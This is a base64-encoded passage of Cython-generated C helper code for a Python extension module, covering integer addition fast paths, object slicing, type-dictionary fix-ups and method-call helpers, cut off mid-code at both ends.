AgICAgICAgICBDWVRIT05fRkFMTFRIUk9VR0g7CiAgICAgICAgICAgIGNhc2UgLTQ6CiAgICAgICAgICAgICAgICBpZiAoOCAqIHNpemVvZihsb25nKSAtIDEgPiA0ICogUHlMb25nX1NISUZUKSB7CiAgICAgICAgICAgICAgICAgICAgYSA9IC0obG9uZykgKCgoKCgoKCgodW5zaWduZWQgbG9uZylkaWdpdHNbM10pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMF0pKTsKICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgICNpZmRlZiBIQVZFX0xPTkdfTE9ORwogICAgICAgICAgICAgICAgfSBlbHNlIGlmICg4ICogc2l6ZW9mKFBZX0xPTkdfTE9ORykgLSAxID4gNCAqIFB5TG9uZ19TSElGVCkgewogICAgICAgICAgICAgICAgICAgIGxsYSA9IC0oUFlfTE9OR19MT05HKSAoKCgoKCgoKCh1bnNpZ25lZCBQWV9MT05HX0xPTkcpZGlnaXRzWzNdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIFBZX0xPTkdfTE9ORylkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgUFlfTE9OR19MT05HKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBQWV9MT05HX0xPTkcpZGlnaXRzWzBdKSk7CiAgICAgICAgICAgICAgICAgICAgZ290byBsb25nX2xvbmc7CiAgICAgICAgICAgICAgICAjZW5kaWYKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIENZVEhPTl9GQUxMVEhST1VHSDsKICAgICAgICAgICAgY2FzZSA0OgogICAgICAgICAgICAgICAgaWYgKDggKiBzaXplb2YobG9uZykgLSAxID4gNCAqIFB5TG9uZ19TSElGVCkgewogICAgICAgICAgICAgICAgICAgIGEgPSAobG9uZykgKCgoKCgoKCgodW5zaWduZWQgbG9uZylkaWdpdHNbM10pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMF0pKTsKICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgICNpZmRlZiBIQVZFX0xPTkdfTE9ORwogICAgICAgICAgICAgICAgfSBlbHNlIGlmICg4ICogc2l6ZW9mKFBZX0xPTkdfTE9ORykgLSAxID4gNCAqIFB5TG9uZ19TSElGVCkgewogICAgICAgICAgICAgICAgICAgIGxsYSA9IChQWV9MT05HX0xPTkcpICgoKCgoKCgoKHVuc2lnbmVkIFBZX0xPTkdfTE9ORylkaWdpdHNbM10pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgUFlfTE9OR19MT05HKWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBQWV9MT05HX0xPTkcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIFBZX0xPTkdfTE9ORylkaWdpdHNbMF0pKTsKICAgICAgICAgICAgICAgICAgICBnb3RvIGxvbmdfbG9uZzsKICAgICAgICAgICAgICAgICNlbmRpZgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgQ1lUSE9OX0ZBTExUSFJPVUdIOwogICAgICAgICAgICBkZWZhdWx0OiByZXR1cm4gUHlMb25nX1R5cGUudHBfYXNfbnVtYmVyLT5uYl9hZGQob3AxLCBvcDIpOwogICAgICAgIH0KICAgIH0KICAgICAgICAgICAgeCA9IGEgKyBiOwogICAgICAgIHJldHVybiBQeUxvbmdfRnJvbUxvbmcoeCk7CiNpZmRlZiBIQVZFX0xPTkdfTE9ORwogICAgbG9uZ19sb25nOgogICAgICAgICAgICBsbHggPSBsbGEgKyBsbGI7CiAgICAgICAgcmV0dXJuIFB5TG9uZ19Gcm9tTG9uZ0xvbmcobGx4KTsKI2VuZGlmCiAgICByZXR1cm4gX19QeXhfRmFsbGJhY2tfX19QeXhfUHlMb25nX0FkZE9iakMob3AxLCBvcDIsIGlucGxhY2UpOwogICAgCiAgICAKfQojZW5kaWYKc3RhdGljIFB5T2JqZWN0KiBfX1B5eF9GbG9hdF9fX1B5eF9QeUxvbmdfQWRkT2JqQyhQeU9iamVjdCAqZmxvYXRfdmFsLCBsb25nIGludHZhbCwgaW50IHplcm9kaXZpc2lvbl9jaGVjaykgewogICAgQ1lUSE9OX1VOVVNFRF9WQVIoemVyb2RpdmlzaW9uX2NoZWNrKTsKICAgIGNvbnN0IGxvbmcgYiA9IGludHZhbDsKICAgIGRvdWJsZSBhID0gX19QeXhfUHlGbG9hdF9BU19ET1VCTEUoZmxvYXRfdmFsKTsKICAgICAgICBkb3VibGUgcmVzdWx0OwogICAgICAgIAogICAgICAgIHJlc3VsdCA9ICgoZG91YmxlKWEpICsgKGRvdWJsZSliOwogICAgICAgIHJldHVybiBQeUZsb2F0X0Zyb21Eb3VibGUocmVzdWx0KTsKfQpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlMb25nX0FkZE9iakMoUHlPYmplY3QgKm9wMSwgUHlPYmplY3QgKm9wMiwgbG9uZyBpbnR2YWwsIGludCBpbnBsYWNlLCBpbnQgemVyb2RpdmlzaW9uX2NoZWNrKSB7CiAgICBDWVRIT05fTUFZQkVfVU5VU0VEX1ZBUihpbnR2YWwpOwogICAgQ1lUSE9OX1VOVVNFRF9WQVIoemVyb2RpdmlzaW9uX2NoZWNrKTsKICAgICNpZiBDWVRIT05fVVNFX1BZTE9OR19JTlRFUk5BTFMKICAgIGlmIChsaWtlbHkoUHlMb25nX0NoZWNrRXhhY3Qob3AxKSkpIHsKICAgICAgICByZXR1cm4gX19QeXhfVW5wYWNrZWRfX19QeXhfUHlMb25nX0FkZE9iakMob3AxLCBvcDIsIGludHZhbCwgaW5wbGFjZSwgemVyb2RpdmlzaW9uX2NoZWNrKTsKICAgIH0KICAgICNlbmRpZgogICAgaWYgKFB5RmxvYXRfQ2hlY2tFeGFjdChvcDEpKSB7CiAgICAgICAgcmV0dXJuIF9fUHl4X0Zsb2F0X19fUHl4X1B5TG9uZ19BZGRPYmpDKG9wMSwgaW50dmFsLCB6ZXJvZGl2aXNpb25fY2hlY2spOwogICAgfQogICAgcmV0dXJuIF9fUHl4X0ZhbGxiYWNrX19fUHl4X1B5TG9uZ19BZGRPYmpDKG9wMSwgb3AyLCBpbnBsYWNlKTsKfQojZW5kaWYKCgpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlPYmplY3RfR2V0U2xpY2UoUHlPYmplY3QqIG9iaiwKICAgICAgICBQeV9zc2l6ZV90IGNzdGFydCwgUHlfc3NpemVfdCBjc3RvcCwKICAgICAgICBQeU9iamVjdCoqIF9weV9zdGFydCwgUHlPYmplY3QqKiBfcHlfc3RvcCwgUHlPYmplY3QqKiBfcHlfc2xpY2UsCiAgICAgICAgaW50IGhhc19jc3RhcnQsIGludCBoYXNfY3N0b3AsIENZVEhPTl9VTlVTRUQgaW50IHdyYXBhcm91bmQpIHsKICAgIF9fUHl4X1R5cGVOYW1lIG9ial90eXBlX25hbWU7CiNpZiBDWVRIT05fVVNFX1RZUEVfU0xPVFMKICAgIFB5TWFwcGluZ01ldGhvZHMqIG1wID0gUHlfVFlQRShvYmopLT50cF9hc19tYXBwaW5nOwogICAgaWYgKGxpa2VseShtcCAmJiBtcC0+bXBfc3Vic2NyaXB0KSkKI2VuZGlmCiAgICB7CiAgICAgICAgUHlPYmplY3QqIHJlc3VsdDsKICAgICAgICBQeU9iamVjdCAqcHlfc2xpY2UsICpweV9zdGFydCwgKnB5X3N0b3A7CiAgICAgICAgaWYgKF9weV9zbGljZSkgewogICAgICAgICAgICBweV9zbGljZSA9ICpfcHlfc2xpY2U7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgUHlPYmplY3QqIG93bmVkX3N0YXJ0ID0gTlVMTDsKICAgICAgICAgICAgUHlPYmplY3QqIG93bmVkX3N0b3AgPSBOVUxMOwogICAgICAgICAgICBpZiAoX3B5X3N0YXJ0KSB7CiAgICAgICAgICAgICAgICBweV9zdGFydCA9ICpfcHlfc3RhcnQ7CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICBpZiAoaGFzX2NzdGFydCkgewogICAgICAgICAgICAgICAgICAgIG93bmVkX3N0YXJ0ID0gcHlfc3RhcnQgPSBQeUxvbmdfRnJvbVNzaXplX3QoY3N0YXJ0KTsKICAgICAgICAgICAgICAgICAgICBpZiAodW5saWtlbHkoIXB5X3N0YXJ0KSkgZ290byBiYWQ7CiAgICAgICAgICAgICAgICB9IGVsc2UKICAgICAgICAgICAgICAgICAgICBweV9zdGFydCA9IFB5X05vbmU7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKF9weV9zdG9wKSB7CiAgICAgICAgICAgICAgICBweV9zdG9wID0gKl9weV9zdG9wOwogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgaWYgKGhhc19jc3RvcCkgewogICAgICAgICAgICAgICAgICAgIG93bmVkX3N0b3AgPSBweV9zdG9wID0gUHlMb25nX0Zyb21Tc2l6ZV90KGNzdG9wKTsKICAgICAgICAgICAgICAgICAgICBpZiAodW5saWtlbHkoIXB5X3N0b3ApKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIFB5X1hERUNSRUYob3duZWRfc3RhcnQpOwogICAgICAgICAgICAgICAgICAgICAgICBnb3RvIGJhZDsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9IGVsc2UKICAgICAgICAgICAgICAgICAgICBweV9zdG9wID0gUHlfTm9uZTsKICAgICAgICAgICAgfQogICAgICAgICAgICBweV9zbGljZSA9IFB5U2xpY2VfTmV3KHB5X3N0YXJ0LCBweV9zdG9wLCBQeV9Ob25lKTsKICAgICAgICAgICAgUHlfWERFQ1JFRihvd25lZF9zdGFydCk7CiAgICAgICAgICAgIFB5X1hERUNSRUYob3duZWRfc3RvcCk7CiAgICAgICAgICAgIGlmICh1bmxpa2VseSghcHlfc2xpY2UpKSBnb3RvIGJhZDsKICAgICAgICB9CiNpZiBDWVRIT05fVVNFX1RZUEVfU0xPVFMKICAgICAgICByZXN1bHQgPSBtcC0+bXBfc3Vic2NyaXB0KG9iaiwgcHlfc2xpY2UpOwojZWxzZQogICAgICAgIHJlc3VsdCA9IFB5T2JqZWN0X0dldEl0ZW0ob2JqLCBweV9zbGljZSk7CiNlbmRpZgogICAgICAgIGlmICghX3B5X3NsaWNlKSB7CiAgICAgICAgICAgIFB5X0RFQ1JFRihweV9zbGljZSk7CiAgICAgICAgfQogICAgICAgIHJldHVybiByZXN1bHQ7CiAgICB9CiAgICBvYmpfdHlwZV9uYW1lID0gX19QeXhfUHlUeXBlX0dldEZ1bGx5UXVhbGlmaWVkTmFtZShQeV9UWVBFKG9iaikpOwogICAgUHlFcnJfRm9ybWF0KFB5RXhjX1R5cGVFcnJvciwKICAgICAgICAiJyIgX19QeXhfRk1UX1RZUEVOQU1FICInIG9iamVjdCBpcyB1bnNsaWNlYWJsZSIsIG9ial90eXBlX25hbWUpOwogICAgX19QeXhfREVDUkVGX1R5cGVOYW1lKG9ial90eXBlX25hbWUpOwpiYWQ6CiAgICByZXR1cm4gTlVMTDsKfQoKCnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9QeU9iamVjdF9DYWxsT25lQXJnKFB5T2JqZWN0ICpmdW5jLCBQeU9iamVjdCAqYXJnKSB7CiAgICBQeU9iamVjdCAqYXJnc1syXSA9IHtOVUxMLCBhcmd9OwogICAgcmV0dXJuIF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKGZ1bmMsIGFyZ3MrMSwgMSB8IF9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCk7Cn0KCgojaWYgIUNZVEhPTl9VU0VfVFlQRV9TUEVDUyB8fCAoIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgJiYgUFlfVkVSU0lPTl9IRVggPCAweDAzMDkwMDAwKQojZWxzZQpzdGF0aWMgaW50IF9fUHl4X2NhbGxfdHlwZV90cmF2ZXJzZShQeU9iamVjdCAqbywgaW50IGFsd2F5c19jYWxsLCB2aXNpdHByb2MgdmlzaXQsIHZvaWQgKmFyZykgewogICAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgJiYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA8IDB4MDMwOTAwMDAKICAgIGlmIChfX1B5eF9nZXRfcnVudGltZV92ZXJzaW9uKCkgPCAweDAzMDkwMDAwKSByZXR1cm4gMDsKICAgICNlbmRpZgogICAgaWYgKCFhbHdheXNfY2FsbCkgewogICAgICAgIFB5VHlwZU9iamVjdCAqYmFzZSA9IF9fUHl4X1B5T2JqZWN0X0dldFNsb3QobywgdHBfYmFzZSwgUHlUeXBlT2JqZWN0Kik7CiAgICAgICAgdW5zaWduZWQgbG9uZyBmbGFncyA9IFB5VHlwZV9HZXRGbGFncyhiYXNlKTsKICAgICAgICBpZiAoZmxhZ3MgJiBQeV9UUEZMQUdTX0hFQVBUWVBFKSB7CiAgICAgICAgICAgIHJldHVybiAwOwogICAgICAgIH0KICAgIH0KICAgIFB5X1ZJU0lUKChQeU9iamVjdCopUHlfVFlQRShvKSk7CiAgICByZXR1cm4gMDsKfQojZW5kaWYKCgojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQpzdGF0aWMgUHlfc3NpemVfdCBfX1B5eF9HZXRUeXBlRGljdE9mZnNldCh2b2lkKSB7CiAgICBQeU9iamVjdCAqdHBfZGljdG9mZnNldF9vOwogICAgUHlfc3NpemVfdCB0cF9kaWN0b2Zmc2V0OwogICAgdHBfZGljdG9mZnNldF9vID0gUHlPYmplY3RfR2V0QXR0clN0cmluZygoUHlPYmplY3QqKSgmUHlUeXBlX1R5cGUpLCAiX19kaWN0b2Zmc2V0X18iKTsKICAgIGlmICh1bmxpa2VseSghdHBfZGljdG9mZnNldF9vKSkgcmV0dXJuIC0xOwogICAgdHBfZGljdG9mZnNldCA9IFB5TG9uZ19Bc1NzaXplX3QodHBfZGljdG9mZnNldF9vKTsKICAgIFB5X0RFQ1JFRih0cF9kaWN0b2Zmc2V0X28pOwogICAgaWYgKHVubGlrZWx5KHRwX2RpY3RvZmZzZXQgPT0gMCkpIHsKICAgICAgICBQeUVycl9TZXRTdHJpbmcoCiAgICAgICAgICAgIFB5RXhjX1R5cGVFcnJvciwKICAgICAgICAgICAgIid0eXBlJyBkb2Vzbid0IGhhdmUgYSBkaWN0b2Zmc2V0Iik7CiAgICAgICAgcmV0dXJuIC0xOwogICAgfSBlbHNlIGlmICh1bmxpa2VseSh0cF9kaWN0b2Zmc2V0IDwgMCkpIHsKICAgICAgICBQeUVycl9TZXRTdHJpbmcoCiAgICAgICAgICAgIFB5RXhjX1R5cGVFcnJvciwKICAgICAgICAgICAgIid0eXBlJyBoYXMgYW4gdW5leHBlY3RlZCBuZWdhdGl2ZSBkaWN0b2Zmc2V0LiAiCiAgICAgICAgICAgICJQbGVhc2UgcmVwb3J0IHRoaXMgYXMgQ3l0aG9uIGJ1ZyIpOwogICAgICAgIHJldHVybiAtMTsKICAgIH0KICAgIHJldHVybiB0cF9kaWN0b2Zmc2V0Owp9CnN0YXRpYyBQeU9iamVjdCAqX19QeXhfR2V0VHlwZURpY3QoUHlUeXBlT2JqZWN0ICp0cCkgewogICAgc3RhdGljIFB5X3NzaXplX3QgdHBfZGljdG9mZnNldCA9IDA7CiAgICBpZiAodW5saWtlbHkodHBfZGljdG9mZnNldCA9PSAwKSkgewogICAgICAgIHRwX2RpY3RvZmZzZXQgPSBfX1B5eF9HZXRUeXBlRGljdE9mZnNldCgpOwogICAgICAgIGlmICh1bmxpa2VseSh0cF9kaWN0b2Zmc2V0ID09IC0xICYmIFB5RXJyX09jY3VycmVkKCkpKSB7CiAgICAgICAgICAgIHRwX2RpY3RvZmZzZXQgPSAwOyAvLyB0cnkgYWdhaW4gbmV4dCB0aW1lPwogICAgICAgICAgICByZXR1cm4gTlVMTDsKICAgICAgICB9CiAgICB9CiAgICByZXR1cm4gKihQeU9iamVjdCoqKSgoY2hhciopdHAgKyB0cF9kaWN0b2Zmc2V0KTsKfQojZW5kaWYKCgpzdGF0aWMgaW50IF9fUHl4X19TZXRJdGVtT25UeXBlRGljdChQeVR5cGVPYmplY3QgKnRwLCBQeU9iamVjdCAqaywgUHlPYmplY3QgKnYpIHsKICAgIGludCByZXN1bHQ7CiAgICBQeU9iamVjdCAqdHBfZGljdDsKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgIHRwX2RpY3QgPSBfX1B5eF9HZXRUeXBlRGljdCh0cCk7CiAgICBpZiAodW5saWtlbHkoIXRwX2RpY3QpKSByZXR1cm4gLTE7CiNlbHNlCiAgICB0cF9kaWN0ID0gdHAtPnRwX2RpY3Q7CiNlbmRpZgogICAgcmVzdWx0ID0gUHlEaWN0X1NldEl0ZW0odHBfZGljdCwgaywgdik7CiAgICBpZiAobGlrZWx5KCFyZXN1bHQpKSB7CiAgICAgICAgUHlUeXBlX01vZGlmaWVkKHRwKTsKICAgICAgICBpZiAodW5saWtlbHkoUHlPYmplY3RfSGFzQXR0cih2LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc2V0X25hbWUpKSkgewogICAgICAgICAgICBQeU9iamVjdCAqc2V0TmFtZVJlc3VsdCA9IFB5T2JqZWN0X0NhbGxNZXRob2RPYmpBcmdzKHYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zZXRfbmFtZSwgIChQeU9iamVjdCAqKSB0cCwgaywgTlVMTCk7CiAgICAgICAgICAgIGlmICghc2V0TmFtZVJlc3VsdCkgcmV0dXJuIC0xOwogICAgICAgICAgICBQeV9ERUNSRUYoc2V0TmFtZVJlc3VsdCk7CiAgICAgICAgfQogICAgfQogICAgcmV0dXJuIHJlc3VsdDsKfQoKCnN0YXRpYyBpbnQgX19QeXhfZml4X3VwX2V4dGVuc2lvbl90eXBlX2Zyb21fc3BlYyhQeVR5cGVfU3BlYyAqc3BlYywgUHlUeXBlT2JqZWN0ICp0eXBlKSB7CiNpZiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID4gMHgwMzA5MDBCMQogICAgQ1lUSE9OX1VOVVNFRF9WQVIoc3BlYyk7CiAgICBDWVRIT05fVU5VU0VEX1ZBUih0eXBlKTsKICAgIENZVEhPTl9VTlVTRURfVkFSKF9fUHl4X19TZXRJdGVtT25UeXBlRGljdCk7CiNlbHNlCiAgICBjb25zdCBQeVR5cGVfU2xvdCAqc2xvdCA9IHNwZWMtPnNsb3RzOwogICAgaW50IGNoYW5nZWQgPSAwOwojaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgIHdoaWxlIChzbG90ICYmIHNsb3QtPnNsb3QgJiYgc2xvdC0+c2xvdCAhPSBQeV90cF9tZW1iZXJzKQogICAgICAgIHNsb3QrKzsKICAgIGlmIChzbG90ICYmIHNsb3QtPnNsb3QgPT0gUHlfdHBfbWVtYmVycykgewojaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTgogICAgICAgIGNvbnN0CiNlbmRpZiAgLy8gIUNZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTikKICAgICAgICAgICAgUHlNZW1iZXJEZWYgKm1lbWIgPSAoUHlNZW1iZXJEZWYqKSBzbG90LT5wZnVuYzsKICAgICAgICB3aGlsZSAobWVtYiAmJiBtZW1iLT5uYW1lKSB7CiAgICAgICAgICAgIGlmIChtZW1iLT5uYW1lWzBdID09ICdfJyAmJiBtZW1iLT5uYW1lWzFdID09ICdfJykgewogICAgICAgICAgICAgICAgaWYgKHN0cmNtcChtZW1iLT5uYW1lLCAiX193ZWFrbGlzdG9mZnNldF9fIikgPT0gMCkgewogICAgICAgICAgICAgICAgICAgIGFzc2VydChtZW1iLT50eXBlID09IFRfUFlTU0laRVQpOwogICAgICAgICAgICAgICAgICAgIGFzc2VydChtZW1iLT5mbGFncyA9PSBSRUFET05MWSk7CiAgICAgICAgICAgICAgICAgICAgdHlwZS0+dHBfd2Vha2xpc3RvZmZzZXQgPSBtZW1iLT5vZmZzZXQ7CiAgICAgICAgICAgICAgICAgICAgY2hhbmdlZCA9IDE7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlIGlmIChzdHJjbXAobWVtYi0+bmFtZSwgIl9fZGljdG9mZnNldF9fIikgPT0gMCkgewogICAgICAgICAgICAgICAgICAgIGFzc2VydChtZW1iLT50eXBlID09IFRfUFlTU0laRVQpOwogICAgICAgICAgICAgICAgICAgIGFzc2VydChtZW1iLT5mbGFncyA9PSBSRUFET05MWSk7CiAgICAgICAgICAgICAgICAgICAgdHlwZS0+dHBfZGljdG9mZnNldCA9IG1lbWItPm9mZnNldDsKICAgICAgICAgICAgICAgICAgICBjaGFuZ2VkID0gMTsKICAgICAgICAgICAgICAgIH0KI2lmIENZVEhPTl9NRVRIX0ZBU1RDQUxMCiAgICAgICAgICAgICAgICBlbHNlIGlmIChzdHJjbXAobWVtYi0+bmFtZSwgIl9fdmVjdG9yY2FsbG9mZnNldF9fIikgPT0gMCkgewogICAgICAgICAgICAgICAgICAgIGFzc2VydChtZW1iLT50eXBlID09IFRfUFlTU0laRVQpOwogICAgICAgICAgICAgICAgICAgIGFzc2VydChtZW1iLT5mbGFncyA9PSBSRUFET05MWSk7CiNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMDgwMGI0CiAgICAgICAgICAgICAgICAgICAgdHlwZS0+dHBfdmVjdG9yY2FsbF9vZmZzZXQgPSBtZW1iLT5vZmZzZXQ7CiNlbHNlCiAgICAgICAgICAgICAgICAgICAgdHlwZS0+dHBfcHJpbnQgPSAocHJpbnRmdW5jKSBtZW1iLT5vZmZzZXQ7CiNlbmRpZgogICAgICAgICAgICAgICAgICAgIGNoYW5nZWQgPSAxOwogICAgICAgICAgICAgICAgfQojZW5kaWYgIC8vIENZVEhPTl9NRVRIX0ZBU1RDQUxMCiNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZCiAgICAgICAgICAgICAgICBlbHNlIGlmIChzdHJjbXAobWVtYi0+bmFtZSwgIl9fbW9kdWxlX18iKSA9PSAwKSB7CiAgICAgICAgICAgICAgICAgICAgUHlPYmplY3QgKmRlc2NyOwogICAgICAgICAgICAgICAgICAgIGFzc2VydChtZW1iLT50eXBlID09IFRfT0JKRUNUKTsKICAgICAgICAgICAgICAgICAgICBhc3NlcnQobWVtYi0+ZmxhZ3MgPT0gMCB8fCBtZW1iLT5mbGFncyA9PSBSRUFET05MWSk7CiAgICAgICAgICAgICAgICAgICAgZGVzY3IgPSBQeURlc2NyX05ld01lbWJlcih0eXBlLCBtZW1iKTsKICAgICAgICAgICAgICAgICAgICBpZiAodW5saWtlbHkoIWRlc2NyKSkKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIC0xOwogICAgICAgICAgICAgICAgICAgIGludCBzZXRfaXRlbV9yZXN1bHQgPSBQeURpY3RfU2V0SXRlbSh0eXBlLT50cF9kaWN0LCBQeURlc2NyX05BTUUoZGVzY3IpLCBkZXNjcik7CiAgICAgICAgICAgICAgICAgICAgUHlfREVDUkVGKGRlc2NyKTsKICAgICAgICAgICAgICAgICAgICBpZiAodW5saWtlbHkoc2V0X2l0ZW1fcmVzdWx0IDwgMCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIC0xOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBjaGFuZ2VkID0gMTsKICAgICAgICAgICAgICAgIH0KI2VuZGlmICAvLyAhQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZCiAgICAgICAgICAgIH0KICAgICAgICAgICAgbWVtYisrOwogICAgICAgIH0KICAgIH0KI2VuZGlmICAvLyAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQojaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fUFlQWQogICAgc2xvdCA9IHNwZWMtPnNsb3RzOwogICAgd2hpbGUgKHNsb3QgJiYgc2xvdC0+c2xvdCAmJiBzbG90LT5zbG90ICE9IFB5X3RwX2dldHNldCkKICAgICAgICBzbG90Kys7CiAgICBpZiAoc2xvdCAmJiBzbG90LT5zbG90ID09IFB5X3RwX2dldHNldCkgewogICAgICAgIFB5R2V0U2V0RGVmICpnZXRzZXQgPSAoUHlHZXRTZXREZWYqKSBzbG90LT5wZnVuYzsKICAgICAgICB3aGlsZSAoZ2V0c2V0ICYmIGdldHNldC0+bmFtZSkgewogICAgICAgICAgICBpZiAoZ2V0c2V0LT5uYW1lWzBdID09ICdfJyAmJiBnZXRzZXQtPm5hbWVbMV0gPT0gJ18nICYmIHN0cmNtcChnZXRzZXQtPm5hbWUsICJfX21vZHVsZV9fIikgPT0gMCkgewogICAgICAgICAgICAgICAgUHlPYmplY3QgKmRlc2NyID0gUHlEZXNjcl9OZXdHZXRTZXQodHlwZSwgZ2V0c2V0KTsKICAgICAgICAgICAgICAgIGlmICh1bmxpa2VseSghZGVzY3IpKQogICAgICAgICAgICAgICAgICAgIHJldHVybiAtMTsKICAgICAgICAgICAgICAgICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgICAgICAgICAgICAgICBQeU9iamVjdCAqcHluYW1lID0gUHlVbmljb2RlX0Zyb21TdHJpbmcoZ2V0c2V0LT5uYW1lKTsKICAgICAgICAgICAgICAgIGlmICh1bmxpa2VseSghcHluYW1lKSkgewogICAgICAgICAgICAgICAgICAgIFB5X0RFQ1JFRihkZXNjcik7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIC0xOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgaW50IHNldF9pdGVtX3Jlc3VsdCA9IF9fUHl4X1NldEl0ZW1PblR5cGVEaWN0KHR5cGUsIHB5bmFtZSwgZGVzY3IpOwogICAgICAgICAgICAgICAgUHlfREVDUkVGKHB5bmFtZSk7CiAgICAgICAgICAgICAgICAjZWxzZQogICAgICAgICAgICAgICAgQ1lUSE9OX1VOVVNFRF9WQVIoX19QeXhfX1NldEl0ZW1PblR5cGVEaWN0KTsKICAgICAgICAgICAgICAgIGludCBzZXRfaXRlbV9yZXN1bHQgPSBQeURpY3RfU2V0SXRlbSh0eXBlLT50cF9kaWN0LCBQeURlc2NyX05BTUUoZGVzY3IpLCBkZXNjcik7CiAgICAgICAgICAgICAgICAjZW5kaWYKICAgICAgICAgICAgICAgIFB5X0RFQ1JFRihkZXNjcik7CiAgICAgICAgICAgICAgICBpZiAodW5saWtlbHkoc2V0X2l0ZW1fcmVzdWx0IDwgMCkpIHsKICAgICAgICAgICAgICAgICAgICByZXR1cm4gLTE7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBjaGFuZ2VkID0gMTsKICAgICAgICAgICAgfQogICAgICAgICAgICArK2dldHNldDsKICAgICAgICB9CiAgICB9CiNlbmRpZiAgLy8gIUNZVEhPTl9DT01QSUxJTkdfSU5fUFlQWQogICAgaWYgKGNoYW5nZWQpCiAgICAgICAgUHlUeXBlX01vZGlmaWVkKHR5cGUpOwojZW5kaWYgIC8vIFBZX1ZFUlNJT05fSEVYID4gMHgwMzA5MDBCMQogICAgcmV0dXJuIDA7Cn0KCgpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlPYmplY3RfQ2FsbE5vQXJnKFB5T2JqZWN0ICpmdW5jKSB7CiAgICBQeU9iamVjdCAqYXJnWzJdID0ge05VTEwsIE5VTEx9OwogICAgcmV0dXJuIF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKGZ1bmMsIGFyZyArIDEsIDAgfCBfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpOwp9CgoKc3RhdGljIGludCBfX1B5eF9QeU9iamVjdF9HZXRNZXRob2QoUHlPYmplY3QgKm9iaiwgUHlPYmplY3QgKm5hbWUsIFB5T2JqZWN0ICoqbWV0aG9kKSB7CiAgICBQeU9iamVjdCAqYXR0cjsKI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EUyAmJiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04gJiYgQ1lUSE9OX1VTRV9QWVRZUEVfTE9PS1VQCiAgICBfX1B5eF9UeXBlTmFtZSB0eXBlX25hbWU7CiAgICBQeVR5cGVPYmplY3QgKnRwID0gUHlfVFlQRShvYmopOwogICAgUHlPYmplY3QgKmRlc2NyOwogICAgZGVzY3JnZXRmdW5jIGYgPSBOVUxMOwogICAgUHlPYmplY3QgKipkaWN0cHRyLCAqZGljdDsKICAgIGludCBtZXRoX2ZvdW5kID0gMDsKICAgIGFzc2VydCAo